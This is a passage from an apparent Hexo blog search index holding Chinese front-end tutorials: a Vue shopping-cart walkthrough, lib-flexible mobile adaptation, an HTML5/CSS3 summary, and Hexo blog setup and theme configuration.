先把所有需要使用的属性添加好 this.goodsList = res.data.message // 先默认存在的属性添加给Vue // 动态增加了一个 isChecked属性Vue没有跟踪 this.goodsList.forEach(v =&gt; &#123; v.buycount = this.$store.state.goodsData[v.id] // Vue.set的组件中的用法 this.$set(v, 'isChecked', true) &#125;) &#125;&#125;全选反选：使用计算属性是否勾选 全选，是否每一项都选中了，默认是全部选中1234&lt;th&gt;全选 &lt;!--会触发checkAll 的 set属性，并把值传递到了参数里面--&gt; &lt;el-switch v-model="checkAll"&gt;&lt;/el-switch&gt;&lt;/th&gt;1234&lt;!--渲染页面选中状态--&gt;&lt;el-switch v-model="item.isChecked"&gt;&lt;/el-switch&gt;123456789101112131415161718computed: &#123; // 全选 checkAll: &#123; get() &#123; // 是否全部选中 let checkedArr = this.goodsList.filter(v =&gt; &#123; return v.isChecked &#125;) return checkedArr.length == this.goodsList.length &#125;, // 点击全选按钮 set(value) &#123; this.goodsList.forEach(v =&gt; &#123; v.isChecked = value &#125;) &#125; &#125;,&#125;实现数量加减：采用watch监听，同步修改Vuex中的数据1234567891011121314watch: &#123; goodsList: &#123; deep: true, handler(val, oldVal) &#123; // 整个提交 &#123;id:个数&#125; let sendObj = &#123;&#125; this.goodsList.forEach(v =&gt; &#123; sendObj[v.id] = v.buycount &#125;) // 提交到Vuex this.$store.commit('updateCart', sendObj) &#125; &#125;&#125;,删除：创建一个点击事件，参数为index，通过 splice的方法删除。1&lt;el-button type="danger" @click="delOne(index)" icon="el-icon-delete" circle&gt;&lt;/el-button&gt;123delOne(index) &#123; this.goodsList.splice(index, 1)&#125;通过计算属性实现底部的总数和总价12345678910111213141516171819202122232425262728computed: &#123; // 计算总金额 和总数 checkedGoods() &#123; // 总价 let totalNum = 0 // 总金额 let totalPrice = 0 // 选中的ids let ids = ''; this.goodsList.forEach(v =&gt; &#123; if (v.isChecked == true) &#123; totalNum += v.buycount totalPrice += v.buycount * v.sell_price // 拼接 ids+=v.id; ids+=',' &#125; &#125;) // 去除结尾, ids = ids.slice(0,-1); // 返回多个参数 return &#123; totalNum, totalPrice, ids &#125; &#125;&#125;5: 允许跨域携带cookie因为是前后端分类的项目，接口地址不同源，不同源的接口地址出于考虑安全默认不会携带cookie，需要人为设置开启这个设置只需要在axios中开启一个设置即可：12// 允许axios跨域携带cookie 默认是不携带axios.defaults.withCredentials = true6: 优惠卷7: 订单模块]]></content>
      <categories>
        <category>业务逻辑</category>
      </categories>
      <tags>
        <tag>项目管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue项目中使用lib-flexible解决移动端适配的问题]]></title>
    <url>%2F2018%2F06%2F04%2Fvue%E9%A1%B9%E7%9B%AE%E4%B8%AD%E4%BD%BF%E7%94%A8lib-flexible%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[前言：先说下为什么使用 lib-flexible为了解决移动端适配问题，更多参考：https://www.cnblogs.com/lyzg/p/5058356.html动态改写标签给元素添加data-dpr属性，并且动态改写data-dpr的值给元素添加font-size属性，并且动态改写font-size的值1: 效果（效果更直观）添加lib-flexible前效果（页面不会随视口变化而改变）添加lib-flexible后效果（根节点会根据页面视口变化而变化font-size大小）2: 安装1cnpm install lib-flexible --save3: 项目中导入（main文件中引入）1import 'lib-flexible'4: viewprot设置1&lt;meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1.0,maximum=scale=1.0"&gt;5: 安装cssrem插件cssrem插件是一个把px转换为rem的工具，GitHub：https://github.com/flashlizi/cssrem为什么不安装px2rem-loader？一般很多人都喜欢使用px2rem-loader，因为比起cssrem确实方便很多，但由于我在工作中基于微信做h5页面的时候会使用vux组件库，如果安装这个，需要在build/utils.js中的cssLoader中配置，这样会导致使用vux组件变形。下面也会介绍使用px2rem-loader6: 安装px2rem-loader1cnpm install px2rem-loader --save-dev配置1.打开build/utils.js文件，找到exports.cssLoaders方法，在里面添加如下代码123456const px2remLoader = &#123; loader: 'px2rem-loader', options: &#123; remUint: 75 &#125;&#125;2.修改generateLoaders方法中的loaders1234// 注释掉这一行// const loaders = options.usePostCSS ? [cssLoader, postcssLoader] : [cssLoader]// 修改为const loaders = [cssLoader, px2remLoader]然后重新npm run dev，打开控制台可以看到代码中的px已经被转成了rem7: 注意点此方法只能将.vue文件style标签中的px转成rem，不能将script标签和元素style里面定义的px转成rem如果在.vue文件style中的某一行代码不希望被转成rem，只要在后面写上注释 /*no*/ 就可以了]]></content>
      <categories>
        <category>lib-flexible</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5C3知识点总结]]></title>
    <url>%2F2018%2F05%2F18%2FH5C3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在HTML上有提升：如语义化标签，表单元素，视频音频在CSS上有提升：如炫酷的动画，弹性布局，媒体查询在JS上的提升：一些新的API，如地图，本地存储1: HTML5知识总结兼容h5c3方式：html5shiv语义化标签：header，nav，main，section，article，aside，footer新增表单类型：email，tel，url，number，color，search，range，date，time，datatime-local新增表单属性：autocomplete，placeholder，form拖拽属性：draggable视频音频：video，audio类名操作：classlistweb存储cookie的大小不超过4kb，且每次请求都会发送回服务器，在设置的过期时间前有效，即使关闭浏览器localStorage：在2.5~10kb之间，数据始终有效，跨浏览器无效？，且不提供搜索功能，不能建立自定义的索引，——-&gt;诞生了indexDB：浏览器提供的本地数据库，至少250kb，甚至没有上限sessionStorage：基于会话，关闭浏览器之后数据消失，5M大小，跨浏览器无效伸缩矢量图：SVG事件：resize，input应用程序缓存：application chche ：创建chche manifest文件文件通讯协议：websocket文件读取：fileReader设置自定义属性：data-监听网络状态​2: CSS3知识总结新增选择器：nth-child（）、nth-of-type（）、：checked、：disabled盒模型：box-sizing背景：background-image、background-size、background-origin渐变：linear-gradient、radial-gradient边框：border-radius、border-image阴影：box-shadow、text-shadow2D / 3D转换：transform：translate rotate scale过渡：transition动画：keyframes、animation弹性布局：flex媒体查询：@media]]></content>
      <categories>
        <category>H5C3</category>
      </categories>
      <tags>
        <tag>HTML5 / CSS3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo使用（二） 配置 pure 主题样式]]></title>
    <url>%2F2017%2F05%2F27%2Fhexo%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89%20%E9%85%8D%E7%BD%AE%20pure%20%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[配置 hexo pure 主题样式详解（后续补充更多样式）1: hexo 主题使用的是：hexo-theme-pure1.1: 克隆主题并剪切到 \hexo\themes 文件夹下1git clone git@github.com:cofess/hexo-theme-pure.git1.2: 配置 使用 hexo-theme-pure 主题，在站点配置文件_config.yml中修改以下文件1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-pure2: 配置hexo 的 pure 主题注意点2.1: 编辑文件全程使用 sublime 编辑，不要用记事本打开，不会出现乱码的情况，相信搭建都知道原因2.2: 编辑文件基本都是两个文件（注意下面配置说明配置哪个文件，不要错了）配置站点文件 _config.yml配置主题文件 _config.yml3: 解决中文乱码问题在站点配置文件_config.yml中添加1language: zh-CN4: 文章设置属性（Typora 编辑 md 文件）打开需要编辑的文章12345678---title: 文章标题date: 2017-05-27 13:47:40 // 设置文件发布时间（默认是当前时间）categories: // 设置文章分类- 分类名称tags: // 设置文章标签- 标签名称toc: true //是否启用文字目录5: 分类 标签 项目 书单 友链 关于设置（C:\hexo\source）12345678910111213// 使每个目录都有自己的功能title: 分类 // 标题 date: 2019-02-28 23:56:22 // 时间layout: categories // 输出类型type: categories // 类别// 目录结构分类：categories标签：tags项目：repository书单：books友链：links关于：about6: 友链的编辑（C:\hexo\source \ _data\links.yml）123456789// links创造狮: link: http://chuangzaoshi.com/ avatar: /images/favatar/chuangzaoshi-logo.png desc: 为创意工作者而设计腾讯设计导航: link: http://idesign.qq.com/ avatar: /images/favatar/idesign-logo.png desc: 网罗全网高逼格的设计站点7: 搜索功能7.1: 安装1npm i hexo-generator-json-content --save7.2: 主题设置123search: insight: true # you need to install `hexo-generator-json-content` before using Insight Search baidu: true # you need to disable other search engines to use Baidu search8: 文字字数，阅读时长8.1: 安装1$ npm install hexo-wordcount --save8.2: 主题设置12345# wordcountpostCount: enable: true wordcount: true # 文章字数统计 min2read: true # 阅读时长预计9: 评论功能12参考：https://blog.csdn.net/blue_zy/article/details/79071414参考：https://notes.doublemine.me/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud10: 主题背景特效背景动画 基于canvas，在\themes\pure\layout\layout.ejs的中面添加1&lt;script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"&gt;&lt;/script&gt;11: 阅读次数统计本来想用leancloud来统计，因为不蒜子不能管理相关博文的阅读量，但是配置完leancloud会报错~..~只能选用不蒜子，在主题配置文件 中把busuanzi设置为true即可：123pv: busuanzi: enable: true # 不蒜子统计12: hexo-adminGithub：https://github.com/jaredly/hexo-admin简介：可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。最方便的是可以很方便的给文章加标题、分类、打标签。12.1: 安装这个插件需要升级npm，先升级1npm install -g npm12.2: 然后安装1npm install --save hexo-admin12.3: 配置：在站点配置文件 _config.yml中添加1234admin: username: myfavoritename password_hash: be121740bf988b2225a313fa1f107ca1 secret: a secret something这个配置可以直接在admin Settings &gt; Setup authentification 页面中输入数据获取，secret是用于产生cookie值的。13: hexo-wordcount简介：为文章添加文章字数统计、文章预计阅读时间13.1: 安装：1npm install hexo-wordcount --save13.2: 配置：在主题配置文件 中设置为true：12345# wordcountpostCount: enable: true wordcount: true # 文章字数统计 min2read: true # 阅读时长预计14: hexo-neatGithub：https://github.com/rozbo/hexo-neat简介：自动压缩html、css、js代码14.1: 安装：1npm install hexo-neat --save14.2: 配置：在站点配置文件_config.yml中添加123456789101112131415neat_enable: trueneat_html: enable: ture exclude:neat_css: enable: true exclude: - '*.min.css'neat_js: enable: true mangle: true output: compress: exclude: - '*.min.js'15: 单击页面出现小爱心找到主题下面 layout.ejs 文件夹： themes\hexo-theme-pure\layout\layout.ejs 最下面添加以下代码1&lt;script type="text/javascript" src="//cdn.jsdelivr.net/gh/ygbhf/clicklove/clicklove.js"&gt;&lt;/script&gt;16: 取消目录的编号修改：hexo\themes\hexo-theme-pure\layout_partial\sidebar-toc.ejs 文件夹下的123&lt;%- toc(post.content) %&gt;改为&lt;%- toc(post.content,&#123;list_number: false&#125;) %&gt;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo使用（一） 搭建博客]]></title>
    <url>%2F2017%2F05%2F27%2Fhexo%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[1: 先要在本地安装 node 和 git 环境，申请域名。2: npm 全局安装 hexo1npm install -g hexo3: 创建一个空目录：如我是 hexo, 再初始化 hexo1hexo init4: 预览上传博客12hexo server --debug// 打开 localhost:4000 访问预览如果有恭喜你成功了。5: 上传到github5.1: 在站点配置文件_config.yml中添加以下代码，仓库地址改为你的github仓库地址，用来连接你自己的 github 地址1234deploy: type: git repository: git@github.com:xiechunhao/xiechunhao.github.io.git branch: master5.1: 提交1234hexo generate // 或者简写 hexo ghexo deploy // 或者简写 hexo dhexo clean // 清空缓存// 设置 github 博客项目的 setting 的 GitHub Pages 的 Custom domain 为自己的域名即可6: github 创建一个博客的仓库，配置gitPage6.1: 申请一个自己的域名，阿里云可以去申请（把 xiechunhao.github.io 博客地址映射到 域名上）6.2: 打开仓库的 setting 配置 GitHub Pages 的 Custom domain 域名为你自己申请的域名, 如我的是：然后 通过域名就可以访问到你自己的博客网站了，但是样式比较丑，我们可以去下载好看的主题并配置即可。]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
